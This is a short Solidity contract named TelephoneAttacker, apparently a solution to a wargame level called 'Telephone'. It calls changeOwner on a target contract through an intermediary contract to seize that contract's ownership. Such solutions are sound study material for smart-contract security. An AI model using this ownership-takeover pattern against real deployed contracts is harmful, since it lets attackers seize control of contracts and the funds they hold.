
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;
import "hardhat/console.sol";
import "./ITelephone.sol";
contract TelephoneAttacker {
    ITelephone public telephone;
    function attack(address contractAdress,address _owner) external {
        telephone = ITelephone(contractAdress);
        telephone.changeOwner(_owner);
    }
}